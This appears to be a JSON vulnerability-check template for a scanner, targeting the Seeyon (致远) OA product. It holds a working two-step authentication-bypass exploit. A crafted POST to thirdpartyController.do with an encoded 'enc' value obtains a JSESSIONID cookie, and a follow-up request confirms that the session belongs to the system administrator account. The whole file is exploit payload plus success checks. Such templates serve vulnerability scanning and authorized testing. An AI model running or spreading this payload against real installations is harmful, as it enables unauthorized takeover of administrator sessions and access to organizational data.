{
    "Name": "致远OA-cookie-leak",
    "Description": "致远OA-cookie-leak",
    "Product": "致远OA",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/seeyon/thirdpartyController.do",
        "Port":"",
        "Data":"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"Set-Cookie",
                "Value": "JSESSIONID="
                }, {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "/seeyon/common/"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":"AND"
                },{
                    "Method": "GET",
                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
                    "Uri":"/seeyon/main.do?method=headerjs",
                    "Port":"",
                    "Data":"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
                    "Follow_redirects":"false",
                    "Upload":{"Name": "","fileName": "","filePath": "" },
                    "Response":{
                    "Check_Steps":"AND",
                    "Checks": [
                            {
                            "Operation": "contains", 
                            "Key":"",
                            "Value": "\"name\":\"系统管理员\""
                            }, {
                                "Operation": "contains", 
                                "Key":"",
                                "Value": "\"id\":\"-7273032013234748168\""
                                },
                             {
                            "Operation": "code", 
                            "Key":"",
                            "Value": "200"  
                             }
                    ]
                    },
                    "Next_decide":""
                            }
]}